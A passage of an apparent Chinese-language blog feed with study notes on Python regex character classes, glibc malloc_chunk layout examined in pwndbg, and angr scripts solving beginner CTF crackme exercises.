class="string">&#x27;HaHaHaHaHa&#x27;</span>)</span><br><span class="line">print(mo1) <span class="comment">## 输出报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 非贪心</span></span><br><span class="line">notGreedyHaRegex = re.compile(<span class="string">r&#x27;(Ha)&#123;3,5&#125;&#x27;</span>)</span><br><span class="line">mo2 = notGreedyHaRegex.search(<span class="string">&#x27;HaHaHaHaHa&#x27;</span>)</span><br><span class="line">print(mo2) <span class="comment">## 输出报错</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="建立字符分类"><a href="#建立字符分类" class="headerlink" title="建立字符分类"></a>建立字符分类</h2><ul><li><p>example_1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vowelRegex = re.compile(<span class="string">r&#x27;[aeiouAEIOU]&#x27;</span>) <span class="comment"># 中括号中就是用户需要匹配的字符</span></span><br><span class="line">mo = vowelRegex.findall(<span class="string">&#x27;RoboCop eats baby food. BABY FOOD.&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;Output: &quot;</span>, mo)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output:  [&#39;o&#39;, &#39;o&#39;, &#39;o&#39;, &#39;e&#39;, &#39;a&#39;, &#39;a&#39;, &#39;o&#39;, &#39;o&#39;, &#39;A&#39;, &#39;O&#39;, &#39;O&#39;]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vowelRegex = re.compile(<span class="string">r&#x27;[^aeiouAEIOU]&#x27;</span>) <span class="comment"># 如果在前面加上^符号就代表不匹配这些字符</span></span><br><span class="line">mo = vowelRegex.findall(<span class="string">&#x27;RoboCop eats baby food. BABY FOOD.&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;Output: &quot;</span>, mo)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output:  [&#39;R&#39;, &#39;b&#39;, &#39;C&#39;, &#39;p&#39;, &#39; &#39;, &#39;t&#39;, &#39;s&#39;, &#39; &#39;, &#39;b&#39;, &#39;b&#39;, &#39;y&#39;, &#39; &#39;, &#39;f&#39;, &#39;d&#39;, &#39;.&#39;, &#39; &#39;, &#39;B&#39;, &#39;B&#39;, &#39;Y&#39;, &#39; &#39;, &#39;F&#39;, &#39;D&#39;, &#39;.&#39;]</span><br></pre></td></tr></table></figure></li><li><p>example_2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext...</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;字符分类&quot;&gt;&lt;a href=&quot;#字符分类&quot; class=&quot;headerlink&quot; title=&quot;字符分类&quot;&gt;&lt;/a&gt;字符分类&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\d&lt;/code&gt; —– 0-9的任何数字&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\D&lt;/code&gt; —– </summary>
      
    
    
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pwn heap[malloc_chunk结构体]</title>
    <link href="http://example.com/2021/02/12/CTF/pwn/heap/malloc_chunk%E7%BB%93%E6%9E%84/"/>
    <id>http://example.com/2021/02/12/CTF/pwn/heap/malloc_chunk%E7%BB%93%E6%9E%84/</id>
    <published>2021-02-12T12:23:35.634Z</published>
    <updated>2021-05-03T17:13:55.348Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>文章参考了了网上的一些师傅文章内容，总结了一些自己的理解。</p><h2 id="malloc-chunk结构体成员解析"><a href="#malloc-chunk结构体成员解析" class="headerlink" title="malloc_chunk结构体成员解析"></a>malloc_chunk结构体成员解析</h2><p><code>malloc_chunk</code>结构定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="各个成员的作用"><a href="#各个成员的作用" class="headerlink" title="各个成员的作用"></a>各个成员的作用</h3><ol><li><p><code>prev_size</code></p><ul><li>如果该<code>chunk</code>物理地址相邻的前一<code>chunk</code>(两个指针的差值为前一个chunk大小)是空闲的<code>chunk</code>，这个字段记录的是前一个字符段的大小</li><li>用于储存物理地址相邻的<code>chunk</code>(低地址chunk)的信息</li><li>被共享，如果当前<code>chunk</code>大不够用，可以占用下一个<code>chunk</code>的<code>prev_size</code>字段</li></ul></li><li><p><code>size</code></p><ul><li><p>存储当前<code>chunk</code>的大小，chunk的大小内存申请，与<code>SIZE_SZ</code>有关，如果不是<code>2*SIZE_SZ</code>的整数倍，会自动向上取整到<code>2*SIZE_SZ</code>的整数倍，32位操作系统中<code>SIZE_SZ</code>是32位4个字节，64位操作系统中<code>SIZE_SZ</code>是64位8个字节。32位必须8字节对齐，64位必须16字节对齐，无论32位还是64位，<code>size</code>最后三位都没有用，所用可以用来存储其他信息</p><ul><li><p><strong>NON_MAIN_ARENA</strong></p></li><li><p><strong>IS_MAPPED</strong></p><p>记录当前chunk是否是由<code>mmap</code>申请</p></li><li><p><strong>PREV_INUSE</strong></p><p>记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul></li></ul></li><li><p><code>fd</code>和<code>bk</code></p><ul><li>chunk处于分配状态时，fd地址段存放的是用户数据。chunk在空闲的时候通过链表管理</li><li><code>fd</code>指向上一个空闲（非物理空闲）的chunk</li><li><code>bk</code>指向下一个空闲（非物理空闲）的chunk</li></ul></li><li><p><code>fd_nextsize</code>和<code>bk_nextsize</code></p><ul><li></li></ul></li></ol><ul><li><p>chunk被使用时内存结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, <span class="keyword">in</span> bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, <span class="keyword">in</span> bytes                |A|<span class="number">0</span>|<span class="number">1</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></li><li><p>chunk被释放时内存结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:<span class="string">&#x27; |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="line"><span class="string">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="string">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="string">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="string">        .                                                               .</span></span><br><span class="line"><span class="string"> next   .                                                               |</span></span><br><span class="line"><span class="string">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">`foot:&#x27;</span> |             Size of chunk, <span class="keyword">in</span> bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, <span class="keyword">in</span> bytes                |A|<span class="number">0</span>|<span class="number">0</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></li></ul><h3 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h3><p>malloc函数申请的chunk地址都是8字节或者16字节对齐（32位8字节，64位16字节），所谓字节对齐，就是所有的地址最后8位或16位都是一样的（大多数时候为8的整数倍），常见的内存对齐有8字节对齐和16字节对齐</p><ul><li><p>8字节对齐</p><p>地址的最后8位（2进制位）10进制表示为8</p></li><li><p>16字节对齐</p><p>地址的最后8位（2进制位）10进制表示为0</p></li></ul><p>下面用pwndbg展示32位下chunk内存结构</p><h3 id="pwndbg分析chunk在内存中的结构"><a href="#pwndbg分析chunk在内存中的结构" class="headerlink" title="pwndbg分析chunk在内存中的结构"></a>pwndbg分析chunk在内存中的结构</h3><p>测试源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ptr1 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr2 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr3 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr4 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr5 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr6 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr1-&gt;%p\n&quot;</span>, ptr1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr2-&gt;%p\n&quot;</span>, ptr2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr3-&gt;%p\n&quot;</span>, ptr3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr4-&gt;%p\n&quot;</span>, ptr4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr5-&gt;%p\n&quot;</span>, ptr5);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr6-&gt;%p\n&quot;</span>, ptr6);</span><br><span class="line">        <span class="built_in">free</span>(ptr1);</span><br><span class="line">        <span class="built_in">free</span>(ptr2);</span><br><span class="line">        <span class="built_in">free</span>(ptr3);</span><br><span class="line">        <span class="built_in">free</span>(ptr4);</span><br><span class="line">        <span class="built_in">free</span>(ptr5);</span><br><span class="line">        <span class="built_in">free</span>(ptr6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>32位程序</p><p><img src="malloc_chunk%E7%BB%93%E6%9E%84.assets/image-20210212183615924.png" alt="32位程序malloc申请地址"></p></li><li><p>64位程序</p><p><img src="malloc_chunk%E7%BB%93%E6%9E%84.assets/image-20210212183727096.png" alt="64位程序malloc申请地址"></p></li><li><p>heap命令查看所有堆信息</p><p><img src="malloc_chunk%E7%BB%93%E6%9E%84.assets/image-20210212184244904.png"></p></li><li><p>分析二进制数据</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212195957160.png"></p><p>64位程序chunk结构与之类似</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;文章参考了了网上的一些师傅文章内容，总结了一些自己的理解。&lt;/p&gt;
&lt;h2 id=&quot;malloc-chunk结构体成员解析&quot;&gt;&lt;a href=&quot;#malloc-chunk结构体成员解析&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ctf_angr🦄[angr_0]</title>
    <link href="http://example.com/2021/02/11/CTF/angr/ctf_angr_0/"/>
    <id>http://example.com/2021/02/11/CTF/angr/ctf_angr_0/</id>
    <published>2021-02-11T14:41:47.559Z</published>
    <updated>2021-05-03T17:10:44.425Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="ctf-angr"><a href="#ctf-angr" class="headerlink" title="ctf_angr"></a>ctf_angr</h2><p>一个用于练习angr的ctf题库，从入门到进阶，同时配套全英文ppt，从符号执行到angr详细使用方式，一站式入门👍</p><p>GitHub下载地址[<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM">链接</a>]</p><h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>伪代码非常简单,执行流程为：输入-&gt;加密-&gt;比较-&gt;输出，分支少，所以遍历起来速度很快</p><p><img src="ctf_angr_0.assets/image-20210211150156381.png"></p><p>伪代码易读，数据的字符串经过complex_function函数加密过后比较。</p><p><img src="ctf_angr_0.assets/image-20210211150039313.png" alt="main_function"></p><p><img src="ctf_angr_0.assets/image-20210211150407696.png" alt="complex_function"></p><p>如果按照传统的方法，需要逆加密算法然后写出解密算法，但是angr不需要这些繁琐的操作，只需要告诉其实地址和目标地址，angr就会进行所有遍历，对符号进行约束，从而得出结果。</p><h3 id="angr遍历求解"><a href="#angr遍历求解" class="headerlink" title="angr遍历求解"></a>angr遍历求解</h3><p>首先贴出全代码以及运行结果，最后打印的值就是对符号不断约束求解得到的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">filepath = <span class="string">&#x27;/home/fish/桌面/00_angr_find&#x27;</span></span><br><span class="line"></span><br><span class="line">project = angr.Project(filepath)</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line">print_good_addr = <span class="number">0x0804867D</span></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line">simulation.explore(find = print_good_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="ctf_angr_0.assets/image-20210211150835527.png"></p><p>使用angr过程</p><ol><li><p>创建项目</p><p>首先用Project函数创建一个项目，Project参数为需要求解的二进制文件路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">project = angr.Project(filepath)</span><br></pre></td></tr></table></figure></li><li><p>告诉angr从哪儿开始执行</p><p>entry_state()表明从main函数开始执行（从头开始执行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initial_state = project.factory.entry_state()</span><br></pre></td></tr></table></figure></li><li><p>创建模拟管理器</p><p>simgr是创建函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation = project.factory.simgr(initial_state)</span><br></pre></td></tr></table></figure></li><li><p>开始探索二进制文件</p><p>explore函数需要遍历的结束地址，也就是这个二进制程序中打印字符串**Good Job.**的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_good_address = <span class="number">0x0804867D</span></span><br><span class="line">simulation.explore(find=print_good_address)</span><br></pre></td></tr></table></figure></li><li><p>检查是否找到了解决方案</p><p>如果找到解决方案，found不为空（在pyhon中空代表false，不为空代表true）,将解决方案打印到屏幕输出端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">   solution_state = simulation.found[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></li></ol><h3 id="总结主要过程"><a href="#总结主要过程" class="headerlink" title="总结主要过程"></a>总结主要过程</h3><p>创建工程 –&gt; 指定执行入口 –&gt; 创建二进制文件执行模拟器 –&gt; 探索各个分支 –&gt; 解出解决方案 –&gt; 打印结果</p><h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p>​        这一次的文件较大，main函数在ida中不能F5，即便F5过后也可能因为伪代码较复杂无法阅读，所以在简单观察过后可以直接用angr看是否有解，但是作者这次在程序中加了一点料，方便我们学习avoid参数</p><p>should_succeed这个变量初始值为1本身并没有问题但是avoid_me函数会将should_succeed赋值为0。</p><p><img src="ctf_angr_0.assets/image-20210211161539597.png"></p><p><img src="ctf_angr_0.assets/image-20210211161257626.png"></p><p>​        所以这个如果要打印出**Good Job.**需要两个条件同时满足（should_succeed值为1，且输入的字符串加密过后满足条件），如果在遍历时不添加avoid条件会花费大量的时间（虽然结果一样），为了尽可能的节约时间，需要在遍历时避免avoid_me函数，所以在上一个的条件下，需要在添加其他条件，这里需要添加avoid</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">avoid_addr = <span class="number">0x080485A8</span> <span class="comment"># avoid_me函数地址</span></span><br><span class="line">simgr.explore(find = good_addr, avoid = avoid_addr) <span class="comment"># 添加avoid条件</span></span><br></pre></td></tr></table></figure><p><img src="ctf_angr_0.assets/image-20210211162409904.png"></p><h2 id="02-angr-condtion"><a href="#02-angr-condtion" class="headerlink" title="02_angr_condtion"></a>02_angr_condtion</h2><p>出了在ida中直接寻找字符串地址，还可以自定义函数遍历所有字符串，寻找需要的字符串地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自定义函数寻找字符串</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#print(state)</span></span><br><span class="line">    stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_fail</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#print(state)</span></span><br><span class="line">    stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    print(stdout_stdout)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br></pre></td></tr></table></figure><p>完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    filepath = <span class="string">&#x27;./02_angr_find_condition&#x27;</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init = project.factory.entry_state()</span><br><span class="line">    simgr = project.factory.simgr(init)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_success</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="comment">#print(state)</span></span><br><span class="line">        stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_fail</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="comment">#print(state)</span></span><br><span class="line">        stdout_stdout = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        print(stdout_stdout)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_stdout</span><br><span class="line">    print(is_success)</span><br><span class="line">    print(is_fail)</span><br><span class="line">    simgr.explore(find=is_success, avoid=is_fail)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution = simgr.found[<span class="number">0</span>]</span><br><span class="line">        flag = solution.posix.dumps(<span class="number">0</span>)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;not find&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()                              </span><br></pre></td></tr></table></figure><p><img src="ctf_angr_0.assets/image-20210211223412140.png" alt="输出结果"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h2 id=&quot;ctf-angr&quot;&gt;&lt;a href=&quot;#ctf-angr&quot; class=&quot;headerlink&quot; title=&quot;ctf_angr&quot;&gt;&lt;/a&gt;ctf_angr&lt;/h2&gt;&lt;p&gt;一个用于练习angr的ctf题库，从入门到进阶，同时配</summary>
      
    
    
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="angr" scheme="http://example.com/tags/angr/"/>
    
    <category term="符号执行" scheme="http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr memcpy</title>
    <link href="http://example.com/2021/02/07/CTF/pwn/pwnable/pwnable.kr-memcpy/"/>
    <id>http://example.com/2021/02/07/CTF/pwn/pwnable/pwnable.kr-memcpy/</id>
    <published>2021-02-07T08:58:17.802Z</published>
    <updated>2021-05-03T17:11:49.214Z</updated>
    
